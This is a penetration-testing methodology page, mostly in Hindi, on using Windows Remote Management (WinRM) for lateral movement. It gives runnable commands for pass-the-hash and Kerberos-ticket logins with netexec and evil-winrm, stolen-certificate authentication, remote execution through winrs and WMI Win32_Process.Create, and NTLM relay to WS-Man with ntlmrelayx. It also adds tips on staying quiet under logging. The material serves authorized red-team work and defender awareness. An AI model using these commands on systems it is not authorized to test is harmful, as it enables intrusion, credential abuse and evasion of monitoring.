# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM Windows environments में सबसे सुविधाजनक **lateral movement** transports में से एक है क्योंकि यह आपको **WS-Man/HTTP(S)** के जरिए एक remote shell देता है, बिना SMB service creation tricks की जरूरत के। अगर target **5985/5986** expose करता है और आपका principal remoting use करने की अनुमति रखता है, तो आप अक्सर "valid creds" से "interactive shell" तक बहुत जल्दी पहुंच सकते हैं।

**protocol/service enumeration**, listeners, WinRM enabling, `Invoke-Command`, और generic client usage के लिए, देखें:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operators को WinRM क्यों पसंद है

- **SMB/RPC** की बजाय **HTTP/HTTPS** use करता है, इसलिए यह अक्सर वहां काम करता है जहां PsExec-style execution blocked होती है।
- **Kerberos** के साथ, यह reusable credentials को target पर भेजने से बचाता है।
- **Windows**, **Linux**, और **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) से साफ़ तरीके से काम करता है।
- Interactive PowerShell remoting path target पर authenticated user context के तहत **`wsmprovhost.exe`** spawn करता है, जो service-based exec से operationally अलग है।

## Access model and prerequisites

व्यवहार में, successful WinRM lateral movement **तीन** चीज़ों पर निर्भर करता है:

1. Target पर **WinRM listener** (`5985`/`5986`) और access की अनुमति देने वाले firewall rules हों।
2. Account endpoint पर **authenticate** कर सके।
3. Account को remoting session **open** करने की अनुमति हो।

यह access पाने के common तरीके:

- Target पर **Local Administrator**।
- नए systems पर **Remote Management Users** की membership, या उन systems/components पर **WinRMRemoteWMIUsers__** जो अभी भी उस group को मानते हैं।
- local security descriptors / PowerShell remoting ACL changes के जरिए दिए गए explicit remoting rights।

अगर आप पहले से admin rights वाले box को control करते हैं, तो याद रखें कि आप यहां बताए गए techniques का उपयोग करके **full admin group membership के बिना भी WinRM access delegate** कर सकते हैं:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos को hostname/FQDN चाहिए**। अगर आप IP से connect करते हैं, तो client आमतौर पर **NTLM/Negotiate** पर fallback करता है।
- **workgroup** या cross-trust edge cases में, NTLM के लिए अक्सर या तो **HTTPS** चाहिए या client पर target को **TrustedHosts** में add करना पड़ता है।
- workgroup में **local accounts** के साथ Negotiate over UAC remote restrictions access रोक सकती हैं, जब तक built-in Administrator account use न हो या `LocalAccountTokenFilterPolicy=1` न हो।
- PowerShell remoting by default **`HTTP/<host>` SPN** use करता है। जिन environments में `HTTP/<host>` पहले से किसी और service account को registered है, वहां WinRM Kerberos `0x80090322` के साथ fail हो सकता है; port-qualified SPN use करें या जहां वह SPN मौजूद हो वहां **`WSMAN/<host>`** पर switch करें।

अगर password spraying के दौरान आपको valid credentials मिलते हैं, तो उन्हें WinRM पर validate करना अक्सर यह जांचने का सबसे तेज़ तरीका है कि वे shell में बदलते हैं या नहीं:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### इंटरैक्टिव shell के लिए Evil-WinRM

`evil-winrm` Linux से सबसे सुविधाजनक interactive option बना रहता है क्योंकि यह **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, और in-memory PowerShell/.NET loading को support करता है।
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

जब default **`HTTP/<host>`** SPN Kerberos failures पैदा करता है, तो इसके बजाय **`WSMAN/<host>`** ticket request/use करने की कोशिश करें। यह hardened या odd enterprise setups में दिखता है, जहां **`HTTP/<host>`** पहले से ही किसी दूसरे service account से attached होता है।
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
This is also useful after **RBCD / S4U** abuse when you specifically forged or requested a **WSMAN** service ticket rather than a generic `HTTP` ticket.

### सर्टिफिकेट-आधारित प्रमाणीकरण

WinRM **client certificate authentication** का भी support करता है, लेकिन certificate को target पर **local account** से mapped होना चाहिए। Offensive perspective से यह तब महत्वपूर्ण है जब:

- आपने एक valid client certificate और private key steal/export की हो, जो पहले से WinRM के लिए mapped हों;
- आपने **AD CS / Pass-the-Certificate** abuse करके किसी principal के लिए certificate हासिल किया हो और फिर दूसरे authentication path में pivot किया हो;
- आप ऐसे environments में काम कर रहे हों जो जानबूझकर password-based remoting से बचते हैं।
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM password/hash/Kerberos auth की तुलना में बहुत कम common है, लेकिन जब यह मौजूद होता है, तो यह एक **passwordless lateral movement** path दे सकता है जो password rotation के बाद भी बना रहता है।

### Python / automation with `pypsrp`

अगर आपको operator shell के बजाय automation चाहिए, तो `pypsrp` Python से WinRM/PSRP देता है, जिसमें **NTLM**, **certificate auth**, **Kerberos**, और **CredSSP** support शामिल है।
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` बिल्ट-इन है और तब उपयोगी है जब आप **native WinRM command execution** चाहते हैं बिना interactive PowerShell remoting session खोले:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
संचालनात्मक रूप से, `winrs.exe` आमतौर पर एक रिमोट प्रोसेस चेन में परिणत होता है जो इस प्रकार होता है:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
यह याद रखने लायक है क्योंकि यह service-based exec और interactive PSRP sessions से अलग है।

### `winrm.cmd` / PowerShell remoting के बजाय WS-Man COM

आप **WinRM transport** के जरिए भी `Enter-PSSession` के बिना WS-Man पर WMI classes invoke करके execute कर सकते हैं। इससे transport WinRM ही रहता है, जबकि remote execution primitive **WMI `Win32_Process.Create`** बन जाता है:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
यह तरीका उपयोगी होता है जब:

- PowerShell logging पर कड़ी निगरानी रखी जाती है।
- आप **WinRM transport** चाहते हैं, लेकिन classic PS remoting workflow नहीं।
- आप **`WSMan.Automation`** COM object के आसपास custom tooling बना रहे हैं या उसका उपयोग कर रहे हैं।

## NTLM relay to WinRM (WS-Man)

जब SMB relay signing के कारण block हो जाता है और LDAP relay constrained होता है, तब **WS-Man/WinRM** अभी भी एक आकर्षक relay target हो सकता है। Modern `ntlmrelayx.py` में **WinRM relay servers** शामिल हैं और यह **`wsman://`** या **`winrms://`** targets पर relay कर सकता है।
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
दो व्यावहारिक नोट्स:

- Relay सबसे उपयोगी तब होता है जब target **NTLM** स्वीकार करता है और relayed principal को WinRM इस्तेमाल करने की अनुमति होती है।
- Recent Impacket code खास तौर पर **`WSMANIDENTIFY: unauthenticated`** requests को handle करता है, ताकि `Test-WSMan`-style probes relay flow को break न करें।

पहले WinRM session में landing के बाद multi-hop constraints के लिए, देखें:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC और detection notes

- **Interactive PowerShell remoting** आमतौर पर target पर **`wsmprovhost.exe`** बनाता है।
- **`winrs.exe`** आमतौर पर **`winrshost.exe`** और फिर requested child process बनाता है।
- अगर आप raw `cmd.exe` की बजाय PSRP use करते हैं, तो **network logon** telemetry, WinRM service events, और PowerShell operational/script-block logging की उम्मीद करें।
- अगर आपको सिर्फ एक command चाहिए, तो long-lived interactive remoting session की तुलना में `winrs.exe` या one-shot WinRM execution ज्यादा quiet हो सकता है।
- अगर Kerberos available है, तो trust issues और awkward client-side `TrustedHosts` changes कम करने के लिए IP + NTLM की बजाय **FQDN + Kerberos** prefer करें।

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
